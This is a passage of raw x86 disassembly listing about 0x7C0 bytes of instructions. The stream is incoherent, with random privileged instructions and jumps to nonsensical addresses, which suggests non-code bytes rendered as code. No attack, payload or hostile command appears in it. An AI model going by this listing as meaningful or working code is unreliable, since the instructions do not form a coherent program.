  4027c6:	sub    dh,BYTE PTR [edx+0x1802d]
  4027cc:	add    BYTE PTR [ecx],al
  4027ce:	add    al,0x80
  4027d0:	js     0x4027d2
  4027d2:	sub    DWORD PTR [ecx],esp
  4027d4:	inc    edx
  4027d5:	push   esp
  4027d6:	or     DWORD PTR [esi],eax
  4027d8:	and    al,0x80
  4027da:	add    al,BYTE PTR [eax+edx*2]
  4027dd:	or     BYTE PTR [esi],dh
  4027df:	and    cl,BYTE PTR [eax+0x41c02a00]
  4027e5:	push   ecx
  4027e6:	das    
  4027e7:	push   edx
  4027e8:	fs adc al,0x48
  4027eb:	or     dh,BYTE PTR [eax]
  4027ed:	add    ah,cl
  4027ef:	ret    
  4027f0:	add    BYTE PTR [eax+0x270705],0x10
  4027f7:	nop
  4027f8:	jb     0x402813
  4027fa:	xor    BYTE PTR [eax],al
  4027fc:	push   ebp
  4027fd:	adc    al,0x60
  4027ff:	or     BYTE PTR [ecx],0xc5
  402802:	mov    eax,0x88009ab0
  402807:	xchg   ecx,eax
  402808:	or     BYTE PTR [ebx],al
  40280a:	add    BYTE PTR [edx],0x0
  40280d:	mov    edx,0x2291850
  402812:	add    BYTE PTR [ecx],0x30
  402815:	add    al,0x80
  402817:	and    ch,BYTE PTR [ebx+eax*1]
  40281a:	or     al,BYTE PTR [eax]
  40281c:	add    al,0x99
  40281e:	inc    ebp
  40281f:	mov    WORD PTR [edx+0x0],es
  402822:	and    ah,BYTE PTR [ecx+0xe1722a1]
  402828:	xor    eax,0xc934740b
  40282d:	ins    DWORD PTR es:[edi],dx
  40282e:	inc    eax
  40282f:	add    dl,BYTE PTR [ecx]
  402831:	push   eax
  402832:	or     DWORD PTR [edx+0x2],eax
  402835:	add    al,0x83
  402837:	inc    ecx
  402838:	inc    esp
  402839:	ins    BYTE PTR es:[edi],dx
  40283a:	call   0x816:0x204c001
  402841:	sub    DWORD PTR [esi+0x100118],edi
  402847:	xor    DWORD PTR fs:[eax+eax*4],edx
  40284b:	and    eax,0x2800321d
  402850:	xor    BYTE PTR [esp+edx*1+0x20],ah
  402854:	nop
  402855:	and    dl,BYTE PTR [edx]
  402857:	test   BYTE PTR ds:0x2141000,al
  40285d:	add    al,BYTE PTR [eax+edx*1]
  402860:	adc    al,BYTE PTR [eax]
  402862:	or     dl,BYTE PTR [eax+0x4522040c]
  402868:	add    BYTE PTR [eax-0x47f7d9dc],dl
  40286e:	or     al,BYTE PTR [esi+ebp*1]
  402871:	inc    eax
  402872:	mov    edx,edx
  402874:	and    BYTE PTR ds:0x3054,dl
  40287a:	inc    eax
  40287b:	add    BYTE PTR [eax+0x5849008],al
  402881:	or     al,0x8
  402883:	add    al,BYTE PTR [edx]
  402885:	and    BYTE PTR [esp+ecx*1],dl
  402888:	xchg   BYTE PTR [ebp-0x7753d9fe],al
  40288e:	add    BYTE PTR [eax],cl
  402890:	or     BYTE PTR [eax+0x19],al
  402893:	xor    DWORD PTR [eax],ecx
  402895:	pop    edx
  402896:	add    BYTE PTR [ebp-0x10],al
  402899:	and    BYTE PTR [esi],al
  40289b:	or     DWORD PTR [eax+eax*2-0x2df3ce20],esp
  4028a2:	add    BYTE PTR [edx-0x36],0x1a
  4028a6:	push   esp
  4028a7:	adc    BYTE PTR [ecx+eiz*1+0xa7a0208],bh
  4028ae:	add    BYTE PTR [edx+0x0],al
  4028b1:	and    al,0x91
  4028b3:	inc    ecx
  4028b4:	dec    eax
  4028b5:	sub    edx,esi
  4028b7:	add    al,0x40
  4028b9:	add    BYTE PTR [eax+eax*4],dl
  4028bc:	and    al,0x1
  4028be:	add    DWORD PTR [eax-0x6effff58],esp
  4028c4:	add    eax,0xc1011058
  4028c9:	push   ecx
  4028ca:	or     BYTE PTR [eax],al
  4028cc:	adc    al,0x5
  4028ce:	or     edx,DWORD PTR [ecx]
  4028d0:	les    esp,FWORD PTR [ebx+edx*1+0x0]
  4028d4:	xchg   edx,eax
  4028d5:	jo     0x402939
  4028d7:	in     al,0x80
  4028d9:	add    BYTE PTR [edx+0x1052c524],0x0
  4028e0:	sub    BYTE PTR [edx],0x40
  4028e3:	add    BYTE PTR [esi],al
  4028e5:	add    BYTE PTR [eax+ecx*1],ah
  4028e8:	retf   0x2020
  4028eb:	sub    BYTE PTR [eax+0x5a],0x8
  4028ef:	adc    BYTE PTR [eax+0x40],dl
  4028f2:	add    dh,BYTE PTR [eax]
  4028f4:	adc    eax,0xc8450a
  4028f9:	dec    eax
  4028fa:	add    eax,0x12910001
  4028ff:	rol    BYTE PTR ds:0x61140a61,cl
  402905:	push   cs
  402906:	les    ebx,FWORD PTR [esi-0x6b]
  402909:	add    al,0x40
  40290b:	popf   
  40290c:	or     BYTE PTR [edx],al
  40290e:	inc    eax
  40290f:	push   eax
  402910:	add    ecx,DWORD PTR [esi]
  402912:	je     0x402978
  402914:	xchg   ebx,eax
  402915:	add    eax,DWORD PTR [ecx]
  402917:	inc    ebp
  402918:	sub    ebx,DWORD PTR [ecx+0x22]
  40291b:	adc    BYTE PTR [eax+ecx*1],ah
  40291e:	add    BYTE PTR ds:0x8c884001,al
  402924:	adc    al,ah
  402926:	add    dh,BYTE PTR [ecx]
  402928:	add    eax,DWORD PTR [edx+0x10]
  40292b:	inc    ebx
  40292c:	mov    BYTE PTR [edx+0x34],bl
  40292f:	mov    al,ds:0x145e71
  402934:	inc    eax
  402935:	pushf  
  402936:	push   0xb0021160
  40293b:	add    BYTE PTR [eax],ch
  40293d:	mov    ah,0x30
  40293f:	and    BYTE PTR [ecx+0x10a44],ah
  402945:	nop
  402946:	mov    ds:0x4a1004a2,al
  40294b:	add    al,0x40
  40294d:	xchg   ebx,eax
  40294e:	mov    ch,0x58
  402950:	push   edx
  402951:	xchg   edx,eax
  402952:	xor    al,0x10
  402954:	adc    DWORD PTR ds:0x40d84900,ebp
  40295a:	add    BYTE PTR [eax+0x0],0x51
  40295e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40295f:	add    eax,0x44422c2e
  402964:	or     BYTE PTR [eax],ah
  402966:	pop    ecx
  402967:	rcl    DWORD PTR [esi],cl
  402969:	xor    BYTE PTR [eax+0x3304408],al
  40296f:	or     BYTE PTR [eax],al
  402971:	adc    DWORD PTR [eax],edx
  402973:	xor    BYTE PTR [eax+0x200080c1],al
  402979:	add    al,0xa9
  40297b:	add    DWORD PTR [eax],edx
  40297d:	nop
  40297e:	add    al,BYTE PTR [ebp+0x38584120]
  402984:	mov    WORD PTR [eax+ecx*1],ss
  402987:	pop    ebp
  402988:	add    al,0x0
  40298a:	mov    al,ds:0x30404384
  40298f:	xor    al,0x0
  402991:	fs inc eax
  402993:	and    DWORD PTR [eax],esp
  402995:	adc    dh,BYTE PTR [eax-0x3bf6f7f3]
  40299b:	adc    al,0x10
  40299d:	inc    edx
  40299e:	add    eax,0xa002b60
  4029a3:	add    BYTE PTR [eax],dh
  4029a5:	or     ah,BYTE PTR [edx]
  4029a7:	pusha  
  4029a8:	adc    DWORD PTR [ecx],esp
  4029aa:	add    al,0x22
  4029ac:	and    esi,DWORD PTR [eax-0x3fbfff58]
  4029b2:	inc    esi
  4029b3:	add    DWORD PTR [edi],0x8f0885
  4029b9:	sub    BYTE PTR [ebp+0x18],dl
  4029bc:	add    BYTE PTR [eax+0x4],al
  4029bf:	push   ecx
  4029c0:	pop    ss
  4029c1:	add    DWORD PTR [eax],ecx
  4029c3:	add    WORD PTR [ecx+eax*1],bp
  4029c7:	and    BYTE PTR [eax],0x2
  4029ca:	mov    BYTE PTR [esi+0x6164059c],al
  4029d0:	enter  0x1b71,0x9
  4029d4:	rol    BYTE PTR [eax+0x1d0e1008],0x0
  4029db:	and    cl,BYTE PTR [eax]
  4029dd:	dec    eax
  4029de:	add    al,0x80
  4029e0:	adc    edx,DWORD PTR [eax+eax*1]
  4029e3:	add    BYTE PTR [eax-0x59e7bff8],al
  4029e9:	push   0xffffffc0
  4029eb:	add    BYTE PTR [esi+0x1c],dl
  4029ee:	add    dh,BYTE PTR ds:0xc20f4051
  4029f4:	in     al,0x0
  4029f6:	mov    ds:0xc0001119,al
  4029fb:	and    dh,0x95
  4029fe:	add    al,0x15
  402a00:	inc    ax
  402a02:	mov    dl,BYTE PTR [eax]
  402a04:	inc    ecx
  402a05:	adc    dl,BYTE PTR [edx-0x6e]
  402a08:	lods   al,BYTE PTR ds:[esi]
  402a09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a0a:	inc    esp
  402a0b:	scas   eax,DWORD PTR es:[edi]
  402a0c:	or     DWORD PTR [edx],edx
  402a0e:	pop    ebp
  402a0f:	add    BYTE PTR [eax],ch
  402a11:	sbb    BYTE PTR [eax],cl
  402a13:	or     BYTE PTR [eax],0x81
  402a16:	add    DWORD PTR [edx*1+0x74a24c20],eax
  402a1d:	add    BYTE PTR [esp+eax*2+0x9],dh
  402a21:	rcl    DWORD PTR [eax],1
  402a23:	add    eax,0x2d089602
  402a28:	dec    edx
  402a29:	add    dl,dl
  402a2b:	add    al,0xa2
  402a2d:	rol    BYTE PTR [esp+eax*4],1
  402a30:	inc    ecx
  402a31:	sbb    ecx,DWORD PTR [edx]
  402a33:	adc    al,0x80
  402a35:	mov    WORD PTR [edx-0x80],fs
  402a38:	add    BYTE PTR [edx+ebx*4],al
  402a3b:	xor    cl,BYTE PTR [ecx]
  402a3d:	inc    ecx
  402a3e:	add    BYTE PTR [eax-0x6efff7e7],al
  402a44:	test   al,0xf1
  402a46:	and    bl,ah
  402a48:	push   eax
  402a49:	add    BYTE PTR [esi],dh
  402a4b:	inc    eax
  402a4c:	les    ebx,FWORD PTR [eax]
  402a4e:	cmp    BYTE PTR [ebx+ecx*1+0x0],al
  402a52:	add    BYTE PTR [ecx+0x142],al
  402a58:	pusha  
  402a59:	in     al,0xea
  402a5b:	enter  0x1040,0x23
  402a5f:	add    DWORD PTR [edx],eax
  402a61:	adc    al,0x84
  402a63:	add    al,0xe2
  402a65:	push   es
  402a66:	adc    BYTE PTR [eax],al
  402a68:	xchg   ecx,eax
  402a69:	or     al,al
  402a6b:	inc    eax
  402a6c:	or     DWORD PTR [eax+eax*1],ebp
  402a6f:	inc    ebp
  402a70:	or     al,0x8
  402a72:	test   BYTE PTR [eax],al
  402a74:	adc    al,0x2
  402a76:	push   ecx
  402a77:	sbb    BYTE PTR ds:0x84b04086,al
  402a7d:	and    DWORD PTR [ecx],0x4
  402a80:	and    BYTE PTR [edx],0x14
  402a83:	add    dl,BYTE PTR [eax-0x6ff5e000]
  402a89:	sub    al,0x26
  402a8b:	add    BYTE PTR [eax+0x20068e0c],cl
  402a91:	lods   al,BYTE PTR ds:[esi]
  402a92:	and    eax,0x400040c
  402a97:	popa   
  402a98:	lea    eax,[edx]
  402a9a:	or     al,BYTE PTR [esi+0x42010268]
  402aa0:	mov    DWORD PTR [eax],eax
  402aa2:	add    eax,0x5daa2862
  402aa7:	add    BYTE PTR [eax],0x80
  402aaa:	inc    esp
  402aab:	or     ah,BYTE PTR [edx]
  402aad:	add    BYTE PTR [eax-0x74],0x20
  402ab1:	xchg   edx,eax
  402ab2:	bound  eax,QWORD PTR [eax+0x38c91006]
  402ab8:	test   al,0xa
  402aba:	add    ah,cl
  402abc:	or     al,0x20
  402abe:	xor    eax,0x9e41924a
  402ac3:	add    ah,al
  402ac5:	inc    eax
  402ac6:	and    ebx,ebp
  402ac8:	nop
  402ac9:	mov    BYTE PTR [eax],cl
  402acb:	add    BYTE PTR [ecx+0x40],0x4b
  402acf:	adc    al,dl
  402ad1:	dec    ebp
  402ad2:	and    DWORD PTR [edx],eax
  402ad4:	mov    ds:0x9002048,al
  402ad9:	data16 and al,BYTE PTR [eax+0x60]
  402add:	inc    eax
  402ade:	add    BYTE PTR [ecx-0x71],al
  402ae1:	add    DWORD PTR [edx],edx
  402ae3:	add    BYTE PTR [edi+ecx*1+0x10],dh
  402ae7:	inc    eax
  402ae8:	nop
  402ae9:	add    BYTE PTR [eax+ecx*1-0x79f7fe6c],0x45
  402af1:	and    DWORD PTR [eax],eax
  402af3:	adc    al,0x80
  402af5:	push   es
  402af6:	adc    bl,BYTE PTR [eax]
  402af8:	add    BYTE PTR [eax+0x4020804],cl
  402afe:	add    DWORD PTR [eax],ecx
  402b00:	add    DWORD PTR [eax],edx
  402b02:	add    al,0xd0
  402b04:	push   eax
  402b05:	mov    al,ds:0x40805801
  402b0a:	adc    al,0xb
  402b0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b0d:	and    BYTE PTR [eax+0x1],ah
  402b10:	mov    BYTE PTR [edx],al
  402b12:	hlt    
  402b13:	mov    al,ds:0x40d00988
  402b18:	and    BYTE PTR [eax],al
  402b1a:	add    BYTE PTR ds:0x1aa020,0xd4
  402b21:	nop
  402b22:	inc    eax
  402b23:	add    al,0x80
  402b25:	push   ecx
  402b26:	or     BYTE PTR [edx],cl
  402b28:	mov    ds:0x6469820,al
  402b2d:	xchg   esp,eax
  402b2e:	add    DWORD PTR [esi],0x45058040
  402b34:	adc    DWORD PTR [ecx+eax*8],eax
  402b37:	or     al,0x10
  402b39:	lock adc DWORD PTR [edx],0x1
  402b3d:	rol    DWORD PTR [esp+ebx*4],0x4
  402b41:	loopne 0x402ac9
  402b43:	inc    ebx
  402b44:	mov    cs,WORD PTR [eax+0x3e620c40]
  402b4a:	add    BYTE PTR [eax],0x34
  402b4d:	or     BYTE PTR [ebx],al
  402b4f:	mov    al,ds:0x44059192
  402b54:	add    DWORD PTR [ecx],ecx
  402b56:	sbb    al,0x62
  402b58:	adc    BYTE PTR [ecx+0x0],dl
  402b5b:	cdq    
  402b5c:	dec    esi
  402b5d:	and    al,0x41
  402b5f:	je     0x402ae1
  402b61:	add    DWORD PTR [ecx+0x5880440],eax
  402b67:	and    al,BYTE PTR [esi]
  402b69:	stos   BYTE PTR es:[edi],al
  402b6a:	cmp    ecx,DWORD PTR [eax]
  402b6c:	add    BYTE PTR [eax],al
  402b6e:	add    BYTE PTR ds:0x23a06631,ah
  402b74:	mov    al,0x12
  402b76:	inc    edx
  402b77:	push   esi
  402b78:	test   al,0x20
  402b7a:	nop
  402b7b:	or     al,BYTE PTR [eax]
  402b7d:	and    BYTE PTR [eax],ah
  402b7f:	add    BYTE PTR [esp+eax*2-0x69f7fdfa],bh
  402b86:	adc    BYTE PTR [eax+0x1444d210],0x2c
  402b8d:	les    eax,FWORD PTR [ecx+eax*1]
  402b90:	add    BYTE PTR [eax+0x40041005],ch
  402b96:	add    al,BYTE PTR [edx]
  402b98:	inc    edx
  402b99:	adc    ch,0x1
  402b9c:	nop
  402b9d:	nop
  402b9e:	add    al,BYTE PTR [eax+eax*1-0x7f]
  402ba2:	sub    BYTE PTR [eax],ah
  402ba4:	mov    eax,ds:0x48258814
  402ba9:	push   ss
  402baa:	add    al,al
  402bac:	and    ecx,DWORD PTR [edx]
  402bae:	dec    esp
  402baf:	mov    ds:0x510480,al
  402bb4:	add    BYTE PTR [edx-0x5e77fcfa],bl
  402bba:	xchg   ecx,eax
  402bbb:	inc    eax
  402bbc:	and    BYTE PTR [ecx+0x48],dh
  402bbf:	adc    al,0x8
  402bc1:	add    BYTE PTR [eax-0x6ff5dd7a],al
  402bc7:	xor    eax,0x208442
  402bcc:	add    DWORD PTR [edx],edx
  402bce:	push   eax
  402bcf:	pusha  
  402bd0:	adc    dl,BYTE PTR [esp+eax*1]
  402bd3:	test   DWORD PTR [eax+0xa],edx
  402bd6:	add    dl,BYTE PTR [esi]
  402bd8:	xchg   DWORD PTR [ecx+0x28040ac0],edx
  402bde:	enter  0xaa,0x18
  402be2:	add    al,0x88
  402be4:	sbb    al,BYTE PTR [eax+0x2206464a]
  402bea:	mov    esp,DWORD PTR [eax+eax*1]
  402bed:	les    esp,FWORD PTR fs:[eax-0x70]
  402bf1:	add    al,BYTE PTR [eax]
  402bf3:	or     eax,0xa60b2884
  402bf8:	stos   DWORD PTR es:[edi],eax
  402bf9:	mov    BYTE PTR [eax-0x6e6bb1ff],al
  402bff:	adc    eax,0x2802c41d
  402c04:	pop    es
  402c05:	add    dl,BYTE PTR [eax+0x8]
  402c08:	pusha  
  402c09:	lea    eax,[eax]
  402c0b:	add    al,dh
  402c0d:	and    dl,0xe8
  402c10:	xchg   ecx,eax
  402c11:	add    BYTE PTR [ecx],al
  402c13:	adc    BYTE PTR [eax],ch
  402c15:	mov    ds:0x9048a686,al
  402c1a:	or     BYTE PTR [eax],ch
  402c1c:	add    DWORD PTR [eax],0x2d
  402c1f:	or     al,0x8
  402c21:	jo     0x402ba7
  402c23:	adc    DWORD PTR ds:0x21519800,ecx
  402c29:	add    BYTE PTR [eax],ah
  402c2b:	inc    eax
  402c2c:	or     BYTE PTR [ebx],al
  402c2e:	add    al,0x42
  402c30:	cmp    al,0x13
  402c32:	push   ss
  402c33:	dec    esp
  402c34:	or     eax,0xd220408
  402c39:	add    BYTE PTR [eax],cl
  402c3b:	dec    esp
  402c3c:	add    eax,0x108281a
  402c41:	or     BYTE PTR [eax+0x1084000a],ah
  402c47:	xor    BYTE PTR [ecx+0x1374000],ah
  402c4d:	xchg   DWORD PTR [ecx],edx
  402c4f:	inc    eax
  402c50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c51:	push   ebp
  402c52:	add    al,0x52
  402c54:	add    BYTE PTR ds:0x6004a4c8,dl
  402c5a:	push   es
  402c5b:	pop    esp
  402c5c:	xor    BYTE PTR [eax],al
  402c5e:	xchg   edi,eax
  402c5f:	sub    al,dh
  402c61:	add    BYTE PTR [eax],bl
  402c63:	adc    BYTE PTR [eax],0x0
  402c66:	push   0xffffff84
  402c68:	or     BYTE PTR [edx+0x12],al
  402c6b:	adc    BYTE PTR [ebx],al
  402c6d:	ins    BYTE PTR es:[edi],dx
  402c6e:	add    al,0x1a
  402c70:	mov    dl,0x48
  402c72:	inc    esp
  402c73:	and    DWORD PTR [eax+0x38],ecx
  402c76:	mov    al,ds:0x86500ad0
  402c7b:	add    eax,DWORD PTR [esi]
  402c7d:	add    ch,BYTE PTR [eax+0x9084142]
  402c83:	add    BYTE PTR [eax-0x4a23ef34],0x20
  402c8a:	add    DWORD PTR [eax],esi
  402c8c:	or     eax,eax
  402c8e:	add    BYTE PTR [edx],ah
  402c90:	add    BYTE PTR [eax],dl
  402c92:	mov    es,WORD PTR [ecx+0x40]
  402c95:	jmp    0x262f04a
  402c9a:	add    ch,BYTE PTR [eax+0x9084692]
  402ca0:	and    eax,0xc630249
  402ca5:	inc    ecx
  402ca6:	jb     0x2a234c5
  402cac:	adc    al,BYTE PTR [ecx]
  402cae:	jo     0x402c42
  402cb0:	add    BYTE PTR [edx],al
  402cb2:	pop    eax
  402cb3:	shr    BYTE PTR ds:0x70c1020b,0x40
  402cba:	and    BYTE PTR [eax+esi*1],0x40
  402cbe:	add    eax,DWORD PTR ds:0x88000100
  402cc4:	or     bl,al
  402cc6:	push   edx
  402cc7:	dec    ecx
  402cc8:	or     BYTE PTR [ecx],ch
  402cca:	or     BYTE PTR [eax],dh
  402ccc:	mov    al,ds:0x4214090c
  402cd1:	or     BYTE PTR [eax+esi*1-0x7a],al
  402cd5:	inc    ecx
  402cd6:	push   eax
  402cd7:	sbb    al,0x87
  402cda:	or     edx,DWORD PTR [eax+0x5]
  402cdd:	and    DWORD PTR [eax],eax
  402cdf:	mov    al,ds:0x2410228
  402ce4:	sbb    BYTE PTR [eax+0x10d200c],ah
  402cea:	and    BYTE PTR [edx],al
  402cec:	adc    al,0x5
  402cee:	or     DWORD PTR [ecx],eax
  402cf0:	sub    al,0x70
  402cf2:	add    BYTE PTR [eax+0x4a0c090],dh
  402cf8:	add    BYTE PTR [eax],cl
  402cfa:	sbb    DWORD PTR [edx-0x58],edx
  402cfd:	add    BYTE PTR [edx+0x45],cl
  402d00:	or     BYTE PTR [edx+eax*2-0x4b],0x18
  402d05:	or     edx,DWORD PTR [eax]
  402d07:	dec    ecx
  402d08:	xor    DWORD PTR [ecx],ecx
  402d0a:	adc    al,BYTE PTR [ebx]
  402d0c:	xchg   BYTE PTR [eax],cl
  402d0e:	pop    eax
  402d0f:	inc    eax
  402d10:	jne    0x402d1a
  402d12:	xor    BYTE PTR [eax+edx*1],ah
  402d15:	add    BYTE PTR [ebx],al
  402d17:	pop    ebp
  402d18:	test   al,0x9
  402d1a:	sub    al,0x70
  402d1c:	sub    BYTE PTR [eax+0x20810681],ch
  402d22:	add    BYTE PTR [eax],0x8a
  402d25:	xchg   esi,eax
  402d26:	popf   
  402d27:	and    al,BYTE PTR [ebp+0x8]
  402d2a:	mov    BYTE PTR [eax],al
  402d2c:	sub    DWORD PTR [edx],eax
  402d2e:	push   ebx
  402d2f:	add    BYTE PTR [esi-0x7b9bcffc],ch
  402d35:	push   eax
  402d36:	push   cs
  402d37:	add    BYTE PTR [eax+0x4480018],0x19
  402d3e:	and    dl,ah
  402d40:	jb     0x402d82
  402d42:	inc    ecx
  402d43:	xor    al,0x20
  402d45:	inc    eax
  402d46:	or     dh,cl
  402d48:	add    al,0x0
  402d4a:	mov    al,ds:0x28293
  402d4f:	push   0x2005226
  402d54:	adc    DWORD PTR [eax],eax
  402d56:	xor    BYTE PTR [eax+eiz*1],cl
  402d59:	push   ebx
  402d5a:	mov    eax,ds:0x40010800
  402d5f:	mov    dl,0x58
  402d61:	adc    BYTE PTR [eax],cl
  402d63:	adc    al,0x1
  402d65:	add    BYTE PTR [eax],cl
  402d67:	push   ecx
  402d68:	push   ss
  402d69:	add    DWORD PTR [edi+0x3302c074],eax
  402d6f:	adc    DWORD PTR [eax+eax*1],esp
  402d72:	add    cl,BYTE PTR [ecx]
  402d74:	xchg   BYTE PTR [eax],al
  402d76:	adc    BYTE PTR [ebx],cl
  402d78:	xor    BYTE PTR [eax+0x0],al
  402d7b:	pusha  
  402d7c:	add    BYTE PTR [eax-0x40],al
  402d7f:	add    eax,0x84244222
  402d84:	add    dl,BYTE PTR [eax]
  402d86:	mov    eax,ds:0xc0a202e8
  402d8b:	adc    BYTE PTR [ecx],bh
  402d8d:	add    cl,BYTE PTR [eax+ecx*4]
  402d90:	push   es
  402d91:	rol    BYTE PTR [eax+0x0],1
  402d94:	dec    eax
  402d95:	adc    al,al
  402d97:	nop
  402d98:	adc    DWORD PTR [ebx+0x5840841],0xae098410
  402da2:	adc    BYTE PTR [eax],al
  402da4:	or     BYTE PTR [edx+0x8],dl
  402da7:	jo     0x402db1
  402da9:	add    BYTE PTR [eax-0x7e],dh
  402dac:	xchg   ecx,eax
  402dad:	add    esp,DWORD PTR [eax]
  402daf:	adc    BYTE PTR [edi],dl
  402db1:	add    BYTE PTR [eax+0x1],dl
  402db4:	and    al,0x11
  402db6:	inc    edx
  402db7:	push   es
  402db8:	add    eax,eax
  402dba:	adc    BYTE PTR [eax],ah
  402dbc:	add    cl,BYTE PTR [ecx]
  402dbe:	adc    BYTE PTR [edx+edx*1],al
  402dc1:	add    BYTE PTR [ecx],cl
  402dc3:	add    al,bl
  402dc5:	or     al,BYTE PTR [ebp+0x14625001]
  402dcb:	loop   0x402de1
  402dcd:	or     cl,BYTE PTR [eax+0x2a45017a]
  402dd3:	and    BYTE PTR [ecx],cl
  402dd5:	add    BYTE PTR [edx],al
  402dd7:	or     DWORD PTR [edx],ecx
  402dd9:	push   es
  402dda:	or     al,0x3c
  402ddc:	inc    edx
  402ddd:	adc    DWORD PTR [eax],0x680040a
  402de3:	add    BYTE PTR [eax],al
  402de5:	mov    BYTE PTR [esi],dl
  402de7:	add    BYTE PTR [edx],ah
  402de9:	and    BYTE PTR [ebx+0x48],cl
  402dec:	add    BYTE PTR [eax-0x80],ah
  402def:	loopne 0x402dfa
  402df1:	les    ecx,FWORD PTR [eax]
  402df3:	adc    BYTE PTR [edx+0xc],al
  402df6:	and    al,0xd0
  402df8:	or     DWORD PTR [edx+0x45],eax
  402dfb:	adc    BYTE PTR [eax],ch
  402dfd:	add    DWORD PTR [ecx+0x62],eax
  402e00:	add    BYTE PTR [eax],0x4
  402e03:	or     eax,0xa40a00
  402e08:	add    eax,0x342282e8
  402e0d:	adc    eax,0x84096122
  402e12:	or     al,0x86
  402e14:	inc    edx
  402e15:	add    eax,DWORD PTR [eax]
  402e17:	and    BYTE PTR cs:[eax],al
  402e1a:	adc    BYTE PTR [ecx-0x4f7ff200],al
  402e20:	and    al,0x4
  402e22:	sub    al,BYTE PTR [eax]
  402e24:	add    DWORD PTR [edx],esi
  402e26:	dec    eax
  402e27:	adc    BYTE PTR [ecx],dl
  402e29:	adc    al,0x88
  402e2b:	inc    eax
  402e2c:	mov    al,ds:0x28704100
  402e31:	inc    edx
  402e32:	add    BYTE PTR [edx],al
  402e34:	push   eax
  402e35:	adc    BYTE PTR [eax+0x4598060],ah
  402e3b:	mov    eax,0x2640026
  402e40:	adc    DWORD PTR [eax+0x40],esi
  402e43:	push   eax
  402e44:	and    DWORD PTR [eax+0x18],esp
  402e47:	inc    ecx
  402e48:	inc    edx
  402e49:	add    DWORD PTR [edx],eax
  402e4b:	inc    ebp
  402e4c:	sub    eax,0x111c0150
  402e51:	inc    eax
  402e52:	or     DWORD PTR [ecx+0x4042c2a4],ecx
  402e58:	or     BYTE PTR [edx],al
  402e5a:	push   esi
  402e5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e5c:	add    DWORD PTR [eax+0x44200510],eax
  402e62:	mov    ds:0x40010000,eax
  402e67:	inc    eax
  402e68:	add    BYTE PTR cs:[eax],al
  402e6b:	add    eax,0x180e052c
  402e70:	or     BYTE PTR [eax+0x170906],dl
  402e76:	fs loop 0x402e19
  402e79:	and    DWORD PTR [eax],eax
  402e7b:	inc    eax
  402e7c:	xor    al,0x69
  402e7e:	add    eax,DWORD PTR [edx-0x753dfe7e]
  402e84:	inc    eax
  402e85:	or     DWORD PTR [eax+0x6c822c04],esp
  402e8b:	or     BYTE PTR ds:0x21061800,al
  402e91:	sbb    DWORD PTR [eax],esp
  402e93:	add    BYTE PTR [ebx],cl
  402e95:	add    BYTE PTR [eax-0x5c],dl
  402e98:	and    al,BYTE PTR [ecx+0x24]
  402e9b:	pop    es
  402e9c:	and    BYTE PTR [ebp+0x59804b0c],al
  402ea2:	inc    eax
  402ea3:	inc    eax
  402ea4:	add    BYTE PTR [esi],dh
  402ea6:	inc    esp
  402ea7:	and    BYTE PTR [edx],cl
  402ea9:	or     BYTE PTR [eax+esi*1],0xd8
  402ead:	add    al,BYTE PTR [eax+0x62026]
  402eb3:	or     al,0x1d
  402eb5:	add    BYTE PTR ds:0x4041690,cl
  402ebb:	xor    eax,0x28020012
  402ec0:	adc    al,BYTE PTR [eax]
  402ec2:	or     DWORD PTR [ecx+0x10],edx
  402ec5:	add    BYTE PTR [eax+ecx*2+0x0],dl
  402ec9:	sub    esp,DWORD PTR [edx+0x68]
  402ecc:	add    BYTE PTR [edx],0x0
  402ecf:	ins    DWORD PTR es:[edi],dx
  402ed0:	or     al,0x4
  402ed2:	push   eax
  402ed3:	add    al,0x90
  402ed5:	sub    BYTE PTR [edx],al
  402ed7:	or     BYTE PTR [edx+ebx*4],bl
  402eda:	or     al,0xa0
  402edc:	or     DWORD PTR [eax-0x76],edx
  402edf:	xchg   esp,eax
  402ee0:	or     BYTE PTR [eax+0x0],bh
  402ee3:	jbe    0x402eea
  402ee5:	add    DWORD PTR [ecx],esi
  402ee7:	add    BYTE PTR [eax+0x20],0x10
  402eeb:	dec    eax
  402eec:	push   cs
  402eed:	add    BYTE PTR [ecx-0x5fdffd5f],al
  402ef3:	add    BYTE PTR [eax+eiz*1],cl
  402ef6:	or     BYTE PTR [esi+ebp*2+0x28],dl
  402efa:	inc    eax
  402efb:	add    BYTE PTR [ecx],al
  402efd:	add    DWORD PTR [eax+edx*4+0x8],ecx
  402f01:	xor    eax,0x6ca004
  402f06:	es push es
  402f08:	and    ah,BYTE PTR [ecx-0x73]
  402f0b:	hlt    
  402f0c:	and    BYTE PTR [eax],cl
  402f0e:	and    BYTE PTR [esi],ch
  402f10:	and    BYTE PTR [ecx],al
  402f12:	add    eax,0xc8021035
  402f17:	rol    DWORD PTR [eax+edx*2+0x4583c0],cl
  402f1e:	test   DWORD PTR [ecx],eax
  402f20:	add    al,cl
  402f22:	add    al,BYTE PTR [edx-0x37c75ff4]
  402f28:	add    dl,BYTE PTR [eax-0x59d7a7ff]
  402f2e:	test   BYTE PTR [ecx],dl
  402f30:	in     eax,dx
  402f31:	push   edx
  402f32:	inc    eax
  402f33:	add    BYTE PTR ds:0x618a9a10,al
  402f39:	inc    esi
  402f3a:	add    BYTE PTR [esi+ebx*4+0x60],al
  402f3e:	add    ah,ah
  402f40:	cmp    al,0x40
  402f42:	add    BYTE PTR ds:0x404c4882,cl
  402f48:	add    BYTE PTR [eax],cl
  402f4a:	pop    es
  402f4b:	push   0x12140
  402f50:	and    BYTE PTR [eax],al
  402f52:	call   DWORD PTR ds:0x435200
  402f58:	adc    BYTE PTR [eax],al
  402f5a:	add    DWORD PTR [edx+eax*1],0x40000342
  402f61:	and    eax,0x9310408
  402f66:	ror    BYTE PTR [ecx],0xc0
  402f69:	add    BYTE PTR [eax],al
  402f6b:	add    DWORD PTR [eax+ecx*4-0x5d],0x4a81144
  402f73:	xchg   BYTE PTR [ecx+0x41],al
  402f76:	pusha  
  402f77:	nop
  402f78:	or     BYTE PTR [ecx],al
  402f7a:	adc    esp,DWORD PTR [eax]
  402f7c:	push   cs
  402f7d:	retf   
  402f7e:	add    al,0xc9
  402f80:	or     BYTE PTR [ebx],dl
  402f82:	add    al,0x80
  402f84:	pusha  
  402f85:	add    BYTE PTR [ecx+eax*4],al
  402f88:	and    DWORD PTR ds:0x80010141,eax
